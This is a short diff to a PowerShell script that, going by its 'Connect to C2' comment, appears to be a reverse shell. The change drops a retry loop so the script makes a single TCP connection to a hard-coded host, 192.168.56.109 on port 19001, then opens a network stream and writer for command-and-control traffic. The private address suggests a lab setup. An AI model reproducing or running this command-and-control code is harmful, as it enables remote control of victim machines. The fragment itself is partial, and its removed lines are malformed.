@@ -2,10 +2,9 @@
 Start-Sleep -Seconds 1
 
 # Connect to C2
-try{
-    $TCPClient = New-Object Net.Sockets.TCPClient('192.168.56.109', 19001)
-} catch {}
-} until ($TCPClient.Connected)
+
+$TCPClient = New-Object Net.Sockets.TCPClient('192.168.56.109', 19001)
+
 
 $NetworkStream = $TCPClient.GetStream()
 $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
